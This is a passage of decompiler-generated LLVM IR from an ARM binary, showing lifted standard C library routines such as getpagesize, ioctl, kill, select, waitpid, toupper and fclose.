dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae44
  %v0_ae68 = call i32 @__GI_getpagesize()
  %v5_ae70 = icmp slt i32 %v0_ae68, 4096
  br i1 %v5_ae70, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_ae68
  store i32 %v0_ae68, i32* @r7, align 4
  br label %dec_label_pc_ae8c

bb16:                                             ; preds = %dec_label_pc_ae68
  store i32 4096, i32* @r7, align 4
  br label %dec_label_pc_ae8c

dec_label_pc_ae7c:                                ; preds = %entry
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_ae44, label %dec_label_pc_ae8c, label %dec_label_pc_aea0

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae7c, %bb, %bb16
  %v0_ae8c = phi i32 [ %v0_ae68, %bb ], [ 4096, %bb16 ], [ %arg2, %dec_label_pc_ae7c ]
  %v1_ae90 = call i32 @malloc(i32 %v0_ae8c)
  %v2_ae94 = icmp eq i32 %v1_ae90, 0
  br i1 %v2_ae94, label %dec_label_pc_af14, label %dec_label_pc_aea0

dec_label_pc_aea0:                                ; preds = %dec_label_pc_ae8c, %dec_label_pc_ae7c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_ae7c ], [ %v1_ae90, %dec_label_pc_ae8c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 183, i32* @r7, align 4
  store i32 %storemerge, i32* @r1, align 4
  %tmp = icmp ult i32 %storemerge, -4095
  br i1 %tmp, label %dec_label_pc_aed4, label %dec_label_pc_aebc

dec_label_pc_aebc:                                ; preds = %dec_label_pc_aea0
  %v0_aec0 = call i32 @__aeabi_read_tp()
  %v3_aec4 = load i16, i16* @global_var_23164.175, align 2
  %v4_aec4 = sext i16 %v3_aec4 to i32
  %v0_aec8 = load i32, i32* @r1, align 4
  %v1_aec8 = sub i32 0, %v0_aec8
  %v3_aecc = add i32 %v4_aec4, %v0_aec0
  %v4_aecc = inttoptr i32 %v3_aecc to i32*
  store i32 %v1_aec8, i32* %v4_aecc, align 4
  br label %dec_label_pc_af00

dec_label_pc_aed4:                                ; preds = %dec_label_pc_aea0
  %v1_aed4 = icmp slt i32 %storemerge, 0
  br i1 %v1_aed4, label %dec_label_pc_af00, label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aed4
  %v0_aedc = load i32, i32* @r4, align 4
  %v2_aedc = icmp eq i32 %v0_aedc, 0
  br i1 %v2_aedc, label %bb18, label %dec_label_pc_aef4.thread7

dec_label_pc_aef4.thread7:                        ; preds = %dec_label_pc_aedc
  br label %dec_label_pc_af18

bb18:                                             ; preds = %dec_label_pc_aedc
  %v1_aee0 = load i32, i32* @r6, align 4
  %v3_aee0 = icmp eq i32 %v1_aee0, 0
  br i1 %v3_aee0, label %dec_label_pc_aef4, label %dec_label_pc_aef4.thread

dec_label_pc_aef4.thread:                         ; preds = %bb18
  br label %bb19

dec_label_pc_aef4:                                ; preds = %bb18
  %v1_aeec = inttoptr i32 %storemerge to i32*
  %v2_aeec = call i32 @realloc(i32* %v1_aeec)
  store i32 %v2_aeec, i32* @r4, align 4
  %v2_aef4 = icmp eq i32 %v2_aeec, 0
  br i1 %v2_aef4, label %dec_label_pc_aef4.bb19_crit_edge, label %dec_label_pc_af18

dec_label_pc_aef4.bb19_crit_edge:                 ; preds = %dec_label_pc_aef4
  %v1_aef8.pre = load i32, i32* @r5, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_aef4.bb19_crit_edge, %dec_label_pc_aef4.thread
  %v1_aef8 = phi i32 [ %v1_aef8.pre, %dec_label_pc_aef4.bb19_crit_edge ], [ %storemerge, %dec_label_pc_aef4.thread ]
  store i32 %v1_aef8, i32* @r4, align 4
  br label %dec_label_pc_af18

dec_label_pc_af00:                                ; preds = %dec_label_pc_aed4, %dec_label_pc_aebc
  %v0_af00 = load i32, i32* @r4, align 4
  %v2_af00 = icmp eq i32 %v0_af00, 0
  br i1 %v2_af00, label %dec_label_pc_af08, label %dec_label_pc_af14

dec_label_pc_af08:                                ; preds = %dec_label_pc_af00
  %v0_af08 = load i32, i32* @r5, align 4
  store i32 %v0_af08, i32* @r0, align 4
  %v0_af0c = call i32 @free()
  br label %dec_label_pc_af18

dec_label_pc_af14:                                ; preds = %dec_label_pc_af00, %dec_label_pc_ae8c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_aef4.thread7, %bb19, %dec_label_pc_aef4, %dec_label_pc_af08, %dec_label_pc_ae4c, %dec_label_pc_af14
  %v0_af18 = load i32, i32* @r4, align 4
  store i32 %v3_ae30, i32* @r4, align 4
  store i32 %v6_ae30, i32* @r5, align 4
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  ret i32 %v0_af18

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 4, 3, 0, 2, 5 }
  uselistorder i32 %v0_ae68, { 0, 2, 1 }
  uselistorder label %dec_label_pc_af18, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_ae8c, { 0, 2, 1 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_af3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 156) to i32*), align 4
  %v1_af40 = inttoptr i32 %v4_af3c to i32*
  %v2_af40 = load i32, i32* %v1_af40, align 4
  %v2_af44 = icmp eq i32 %v2_af40, 0
  br i1 %v2_af44, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_af4c = phi i32 [ %v2_af40, %entry ], [ 4096, %bb ]
  ret i32 %v1_af4c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_af68 = load i32, i32* @r0, align 4
  ret i32 %v1_af68
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_af6c = load i32, i32* @r3, align 4
  store i32 %v9_af6c, i32* %stack_var_-4, align 4
  %v3_af70 = load i32, i32* @r4, align 4
  store i32 %v3_af70, i32* %stack_var_-32, align 4
  %v6_af70 = load i32, i32* @r5, align 4
  %v12_af70 = load i32, i32* @r7, align 4
  %v4_af80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_af88 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af88, i32* @r3, align 4
  %v2_af8c = icmp eq i32 %v4_af80, 0
  %v0_af94 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_af94, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_af8c, label %dec_label_pc_afa4, label %dec_label_pc_afdc

dec_label_pc_afa4:                                ; preds = %entry
  %tmp = icmp ult i32 %v0_af94, -4095
  br i1 %tmp, label %dec_label_pc_afd4, label %dec_label_pc_afbc

dec_label_pc_afbc:                                ; preds = %dec_label_pc_afa4
  %v1_afc0 = sub i32 0, %v0_af94
  %v3_afc4 = load i16, i16* @global_var_23164.175, align 2
  %v4_afc4 = sext i16 %v3_afc4 to i32
  store i32 %v4_afc4, i32* @r3, align 4
  %v0_afc8 = call i32 @__aeabi_read_tp()
  %v2_afcc = load i32, i32* @r3, align 4
  %v3_afcc = add i32 %v2_afcc, %v0_afc8
  %v4_afcc = inttoptr i32 %v3_afcc to i32*
  store i32 %v1_afc0, i32* %v4_afcc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_afd4

dec_label_pc_afd4:                                ; preds = %dec_label_pc_afa4, %dec_label_pc_afbc
  %v0_afd4 = phi i32 [ %v0_af94, %dec_label_pc_afa4 ], [ -1, %dec_label_pc_afbc ]
  br label %dec_label_pc_b028

dec_label_pc_afdc:                                ; preds = %entry
  %v0_afdc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_afdc, i32* %r6.global-to-local, align 4
  %v0_afec = load i32, i32* @r4, align 4
  store i32 %v0_afec, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_afec, -4095
  br i1 %tmp15, label %dec_label_pc_b01c, label %dec_label_pc_b004

dec_label_pc_b004:                                ; preds = %dec_label_pc_afdc
  %v1_b008 = sub i32 0, %v0_afec
  %v3_b00c = load i16, i16* @global_var_23164.175, align 2
  %v4_b00c = sext i16 %v3_b00c to i32
  store i32 %v4_b00c, i32* @r3, align 4
  %v0_b010 = call i32 @__aeabi_read_tp()
  store i32 %v0_b010, i32* %r0.global-to-local, align 4
  %v2_b014 = load i32, i32* @r3, align 4
  %v3_b014 = add i32 %v2_b014, %v0_b010
  %v4_b014 = inttoptr i32 %v3_b014 to i32*
  store i32 %v1_b008, i32* %v4_b014, align 4
  %v0_b01c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b01c

dec_label_pc_b01c:                                ; preds = %dec_label_pc_afdc, %dec_label_pc_b004
  %v0_b020 = phi i32 [ %v0_afec, %dec_label_pc_afdc ], [ -1, %dec_label_pc_b004 ]
  %v0_b01c = phi i32 [ %v0_afdc, %dec_label_pc_afdc ], [ %v0_b01c.pre, %dec_label_pc_b004 ]
  store i32 %v0_b01c, i32* %r0.global-to-local, align 4
  store i32 %v0_b020, i32* @r7, align 4
  %v1_b024 = call i32 @__libc_disable_asynccancel(i32 %v0_b01c)
  store i32 %v1_b024, i32* %r0.global-to-local, align 4
  %v0_b028.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b028

dec_label_pc_b028:                                ; preds = %dec_label_pc_afd4, %dec_label_pc_b01c
  %v0_b028 = phi i32 [ %v0_afd4, %dec_label_pc_afd4 ], [ %v0_b028.pre, %dec_label_pc_b01c ]
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v2_b030 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_b030, i32* @r4, align 4
  store i32 %v6_af70, i32* @r5, align 4
  store i32 %v12_af70, i32* @r7, align 4
  ret i32 %v0_b028

; uselistorder directives
  uselistorder i32 %v0_b028, { 1, 0 }
  uselistorder i32 %v0_b01c, { 1, 0 }
  uselistorder i32 %v0_afec, { 1, 2, 0, 3 }
  uselistorder i32 %v0_af94, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_b028, { 1, 0 }
  uselistorder label %dec_label_pc_b01c, { 1, 0 }
  uselistorder label %dec_label_pc_afd4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_b04c = load i32, i32* @r7, align 4
  store i32 %v3_b04c, i32* %stack_var_-8, align 4
  %v0_b058 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b058, -4095
  br i1 %tmp, label %dec_label_pc_b078, label %dec_label_pc_b060

dec_label_pc_b060:                                ; preds = %entry
  %v1_b064 = sub i32 0, %v0_b058
  %v3_b068 = load i16, i16* @global_var_23164.175, align 2
  %v4_b068 = sext i16 %v3_b068 to i32
  %v0_b06c = call i32 @__aeabi_read_tp()
  %v3_b070 = add i32 %v4_b068, %v0_b06c
  %v4_b070 = inttoptr i32 %v3_b070 to i32*
  store i32 %v1_b064, i32* %v4_b070, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_b078.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b078

dec_label_pc_b078:                                ; preds = %entry, %dec_label_pc_b060
  %v1_b07c = phi i32 [ %v0_b058, %entry ], [ -1, %dec_label_pc_b060 ]
  %v2_b078 = phi i32 [ %v3_b04c, %entry ], [ %v2_b078.pre, %dec_label_pc_b060 ]
  store i32 %v2_b078, i32* @r7, align 4
  ret i32 %v1_b07c

; uselistorder directives
  uselistorder i32 %v0_b058, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b078, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_b084 = load i32, i32* @r4, align 4
  store i32 %v3_b084, i32* %stack_var_-12, align 4
  %v0_b094 = load i32, i32* @r0, align 4
  store i32 %v0_b094, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_b094, -4095
  br i1 %tmp, label %dec_label_pc_b0bc, label %dec_label_pc_b0a4

dec_label_pc_b0a4:                                ; preds = %entry
  %v0_b0a8 = call i32 @__aeabi_read_tp()
  %v3_b0ac = load i16, i16* @global_var_23164.175, align 2
  %v4_b0ac = sext i16 %v3_b0ac to i32
  %v0_b0b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b0b0 = sub i32 0, %v0_b0b0
  store i32 %v1_b0b0, i32* %r2.global-to-local, align 4
  %v3_b0b4 = add i32 %v4_b0ac, %v0_b0a8
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i32*
  store i32 %v1_b0b0, i32* %v4_b0b4, align 4
  %v2_b0bc.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_b0bc

dec_label_pc_b0bc:                                ; preds = %entry, %dec_label_pc_b0a4
  %v1_b0c0 = phi i32 [ %v0_b094, %entry ], [ -1, %dec_label_pc_b0a4 ]
  %v2_b0bc = phi i32 [ %v3_b084, %entry ], [ %v2_b0bc.pre, %dec_label_pc_b0a4 ]
  store i32 %v2_b0bc, i32* @r4, align 4
  ret i32 %v1_b0c0

; uselistorder directives
  uselistorder i32 %v0_b094, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b0bc, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_b0c8 = load i32, i32* @r4, align 4
  store i32 %v3_b0c8, i32* %stack_var_-28, align 4
  %v6_b0c8 = load i32, i32* @r5, align 4
  %v9_b0c8 = load i32, i32* @r6, align 4
  %v12_b0c8 = load i32, i32* @r7, align 4
  %v15_b0c8 = load i32, i32* @r8, align 4
  %v18_b0c8 = load i32, i32* @sl, align 4
  %v21_b0c8 = load i32, i32* @lr, align 4
  %v4_b0d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_b0e0 = icmp eq i32 %v4_b0d8, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_b0e0, label %dec_label_pc_b0fc, label %entry.dec_label_pc_b108_crit_edge

entry.dec_label_pc_b108_crit_edge:                ; preds = %entry
  br label %dec_label_pc_b108

dec_label_pc_b0fc:                                ; preds = %entry
  store i32 %v3_b0c8, i32* @r4, align 4
  store i32 %v9_b0c8, i32* @r6, align 4
  store i32 %v12_b0c8, i32* @r7, align 4
  store i32 %v15_b0c8, i32* @r8, align 4
  store i32 %v18_b0c8, i32* %sl.global-to-local, align 4
  %v0_b104 = call i32 @__syscall_select()
  br label %dec_label_pc_b108

dec_label_pc_b108:                                ; preds = %entry.dec_label_pc_b108_crit_edge, %dec_label_pc_b0fc
  %v0_b108 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_b108, i32* @r5, align 4
  %v0_b11c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_b11c, i32* @r0, align 4
  %v0_b124 = call i32 @__syscall_select()
  store i32 %v0_b124, i32* @r4, align 4
  %v0_b12c = load i32, i32* @r5, align 4
  %v1_b130 = call i32 @__libc_disable_asynccancel(i32 %v0_b12c)
  %v0_b134 = load i32, i32* @r4, align 4
  %v2_b13c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_b13c, i32* @r4, align 4
  store i32 %v6_b0c8, i32* @r5, align 4
  store i32 %v9_b0c8, i32* @r6, align 4
  store i32 %v12_b0c8, i32* @r7, align 4
  store i32 %v15_b0c8, i32* @r8, align 4
  store i32 %v18_b0c8, i32* @sl, align 4
  store i32 %v21_b0c8, i32* @lr, align 4
  ret i32 %v0_b134

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b108, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_b150 = ptrtoint i32* %stack_var_-16 to i32
  %v2_b160 = call i32 @gettimeofday(i32 %v2_b150, i32 0)
  %v2_b164 = load i32, i32* %stack_var_-16, align 4
  %v2_b168 = icmp eq i32* %arg1, null
  br i1 %v2_b168, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_b164, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_b164

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_b180 = load i32, i32* @r4, align 4
  store i32 %v3_b180, i32* %stack_var_-20, align 4
  %v6_b180 = load i32, i32* @r5, align 4
  %v9_b180 = load i32, i32* @r6, align 4
  %v12_b180 = load i32, i32* @r7, align 4
  %v4_b18c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 14368) to i32*), align 4
  %v2_b190 = icmp eq i32 %v4_b18c, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_b190, label %dec_label_pc_b1a8, label %dec_label_pc_b1b8

dec_label_pc_b1a8:                                ; preds = %entry
  %v4_b1ac = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  br label %dec_label_pc_b1e0

dec_label_pc_b1b8:                                ; preds = %entry
  %v0_b1b8 = call i32 @__libc_enable_asynccancel()
  %v0_b1bc = load i32, i32* @r6, align 4
  store i32 %v0_b1b8, i32* @r4, align 4
  %v0_b1c4 = load i32, i32* @r7, align 4
  %v0_b1c8 = load i32, i32* @r5, align 4
  %v4_b1d0 = call i32 @wait4(i32 %v0_b1c8, i32 %v0_b1bc, i32 %v0_b1c4, i32 0)
  store i32 %v4_b1d0, i32* @r5, align 4
  %v0_b1d8 = load i32, i32* @r4, align 4
  %v1_b1dc = call i32 @__libc_disable_asynccancel(i32 %v0_b1d8)
  %v0_b1e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b1e0

dec_label_pc_b1e0:                                ; preds = %dec_label_pc_b1a8, %dec_label_pc_b1b8
  %v0_b1e0 = phi i32 [ %v4_b1ac, %dec_label_pc_b1a8 ], [ %v0_b1e0.pre, %dec_label_pc_b1b8 ]
  %v2_b1e8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b1e8, i32* @r4, align 4
  store i32 %v6_b180, i32* @r5, align 4
  store i32 %v9_b180, i32* @r6, align 4
  store i32 %v12_b180, i32* @r7, align 4
  ret i32 %v0_b1e0

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_b1fc = add i32 %arg1, 128
  %v2_b200 = icmp ugt i32 %v1_b1fc, 383
  %v0_b208 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_b200, i32 %v0_b208)
  %v4_b210 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 300) to i32*), align 4
  %v2_b214 = mul i32 %arg1, 2
  %v2_b218 = add i32 %v4_b210, %v2_b214
  %v3_b218 = inttoptr i32 %v2_b218 to i16*
  %v4_b218 = load i16, i16* %v3_b218, align 2
  %v6_b218 = sext i16 %v4_b218 to i32
  ret i32 %v6_b218
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_b228 = load i32, i32* @lr, align 4
  %v0_b230 = call i32 @__aeabi_read_tp()
  %v3_b234 = load i16, i16* @global_var_23164.175, align 2
  %v4_b234 = sext i16 %v3_b234 to i32
  %v2_b238 = add i32 %v4_b234, %v0_b230
  store i32 %v0_b228, i32* @lr, align 4
  ret i32 %v2_b238
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_b248 = load i32, i32* @r4, align 4
  store i32 %v3_b248, i32* %stack_var_-36, align 4
  %v6_b248 = load i32, i32* @r5, align 4
  %v9_b248 = load i32, i32* @r6, align 4
  %v12_b248 = load i32, i32* @r7, align 4
  %v15_b248 = load i32, i32* @r8, align 4
  %v27_b248 = load i32, i32* @lr, align 4
  %v2_b24c = add i32 %tmp, 52
  %v3_b24c = inttoptr i32 %v2_b24c to i32*
  %v4_b24c = load i32, i32* %v3_b24c, align 4
  store i32 %v4_b24c, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b254 = icmp eq i32 %v4_b24c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r8, align 4
  br i1 %v2_b254, label %dec_label_pc_b268, label %dec_label_pc_b2cc

dec_label_pc_b268:                                ; preds = %entry
  %v0_b268 = call i32 @__aeabi_read_tp()
  store i32 %v0_b268, i32* %r0.global-to-local, align 4
  %v0_b26c = load i32, i32* @r5, align 4
  %v1_b26c = add i32 %v0_b26c, 64
  %v2_b26c = inttoptr i32 %v1_b26c to i32*
  %v3_b26c = load i32, i32* %v2_b26c, align 4
  store i32 %v3_b26c, i32* %r3.global-to-local, align 4
  %v1_b270 = add i32 %v0_b268, -1168
  store i32 %v1_b270, i32* @r6, align 4
  %v3_b274 = icmp uge i32 %v3_b26c, %v1_b270
  store i1 %v3_b274, i1* %cpsr_c.global-to-local, align 1
  %v9_b274 = icmp eq i32 %v3_b26c, %v1_b270
  br i1 %v9_b274, label %dec_label_pc_b2c0, label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b268
  %v1_b27c = add i32 %v0_b26c, 56
  store i32 %v1_b27c, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_b27c, i32* %r2.global-to-local, align 4
  %v0_b288 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_b288, i32* @r4, align 4
  %v1_b28c115 = inttoptr i32 %v1_b27c to i32*
  %v2_b28c116 = load i32, i32* %v1_b28c115, align 4
  store i32 %v2_b28c116, i32* %r3.global-to-local, align 4
  %v3_b290118 = icmp uge i32 %v2_b28c116, %v0_b288
  store i1 %v3_b290118, i1* %cpsr_c.global-to-local, align 1
  %v9_b290124 = icmp eq i32 %v2_b28c116, %v0_b288
  br i1 %v9_b290124, label %dec_label_pc_b298, label %dec_label_pc_b2b0

dec_label_pc_b298:                                ; preds = %dec_label_pc_b27c, %dec_label_pc_b298.dec_label_pc_b28c_crit_edge
  %v0_b298125 = phi i32 [ %v1_b290.pre, %dec_label_pc_b298.dec_label_pc_b28c_crit_edge ], [ %v0_b288, %dec_label_pc_b27c ]
  store i32 %v0_b298125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b2a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b2a8, label %dec_label_pc_b2ac, label %dec_label_pc_b298.dec_label_pc_b28c_crit_edge

dec_label_pc_b298.dec_label_pc_b28c_crit_edge:    ; preds = %dec_label_pc_b298
  %v0_b28c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b290.pre = load i32, i32* @r4, align 4
  %v1_b28c = inttoptr i32 %v0_b28c.pre to i32*
  %v2_b28c = load i32, i32* %v1_b28c, align 4
  store i32 %v2_b28c, i32* %r3.global-to-local, align 4
  %v3_b290 = icmp uge i32 %v2_b28c, %v1_b290.pre
  store i1 %v3_b290, i1* %cpsr_c.global-to-local, align 1
  %v9_b290 = icmp eq i32 %v2_b28c, %v1_b290.pre
  br i1 %v9_b290, label %dec_label_pc_b298, label %dec_label_pc_b2b0

dec_label_pc_b2ac:                                ; preds = %dec_label_pc_b298
  %v0_b2ac = load i32, i32* @r4, align 4
  store i32 %v0_b2ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b2b0

dec_label_pc_b2b0:                                ; preds = %dec_label_pc_b27c, %dec_label_pc_b298.dec_label_pc_b28c_crit_edge, %dec_label_pc_b2ac
  %v0_b2b0 = phi i32 [ %v0_b2ac, %dec_label_pc_b2ac ], [ %v2_b28c116, %dec_label_pc_b27c ], [ %v2_b28c, %dec_label_pc_b298.dec_label_pc_b28c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b2b0 = icmp eq i32 %v0_b2b0, 0
  br i1 %v2_b2b0, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_b2b0
  %v1_b2b4 = load i32, i32* @r7, align 4
  store i32 %v1_b2b4, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_b2b0, %bb
  %v1_b2b8 = xor i1 %v2_b2b0, true
  call void @__pseudo_cond_branch(i1 %v1_b2b8, i32 ptrtoint (i32* @global_var_10b94.194 to i32))
  %v0_b2bc = load i32, i32* @r6, align 4
  %v1_b2bc = load i32, i32* @r5, align 4
  %v2_b2bc = add i32 %v1_b2bc, 64
  %v3_b2bc = inttoptr i32 %v2_b2bc to i32*
  store i32 %v0_b2bc, i32* %v3_b2bc, align 4
  %v0_b2c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b2c0

dec_label_pc_b2c0:                                ; preds = %dec_label_pc_b268, %bb41
  %v0_b2c0 = phi i32 [ %v0_b26c, %dec_label_pc_b268 ], [ %v0_b2c0.pre, %bb41 ]
  %v1_b2c0 = add i32 %v0_b2c0, 60
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i32*
  %v3_b2c0 = load i32, i32* %v2_b2c0, align 4
  %v1_b2c4 = add i32 %v3_b2c0, 1
  store i32 %v1_b2c4, i32* %r3.global-to-local, align 4
  store i32 %v1_b2c4, i32* %v2_b2c0, align 4
  %v0_b2cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %entry, %dec_label_pc_b2c0
  %v1_b2d4 = phi i32 [ %tmp, %entry ], [ %v0_b2cc.pre, %dec_label_pc_b2c0 ]
  %v1_b2cc = inttoptr i32 %v1_b2d4 to i16*
  %v2_b2cc = load i16, i16* %v1_b2cc, align 2
  %v3_b2cc = zext i16 %v2_b2cc to i32
  store i32 %v3_b2cc, i32* %r3.global-to-local, align 4
  %v1_b2d0 = and i32 %v3_b2cc, 64
  %v2_b2d0 = icmp eq i32 %v1_b2d0, 0
  br i1 %v2_b2d0, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_b2cc
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_b2cc, %bb42
  %storemerge = phi i32 [ %v1_b2d4, %bb42 ], [ %v1_b2d0, %dec_label_pc_b2cc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 45788, i32* @lr, align 4
  %v1_b2d8 = xor i1 %v2_b2d0, true
  call void @__pseudo_cond_branch(i1 %v1_b2d8, i32 ptrtoint (i32* @global_var_d344.195 to i32))
  %v0_b2dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b2dc, i32* %fp.global-to-local, align 4
  %v0_b2e0 = load i32, i32* @r5, align 4
  %v1_b2e0 = add i32 %v0_b2e0, 4
  %v2_b2e0 = inttoptr i32 %v1_b2e0 to i32*
  %v3_b2e0 = load i32, i32* %v2_b2e0, align 4
  store i32 %v3_b2e0, i32* %r0.global-to-local, align 4
  %v1_b2e4 = call i32 @__GI___libc_close(i32 %v3_b2e0)
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b2ec = load i32, i32* @r8, align 4
  %v2_b2ec = add i32 %v0_b2ec, 168
  %v3_b2ec = inttoptr i32 %v2_b2ec to i32*
  %v4_b2ec = load i32, i32* %v3_b2ec, align 4
  store i32 %v4_b2ec, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_b2f0 = icmp slt i32 %v1_b2e4, 0
  br i1 %v1_b2f0, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
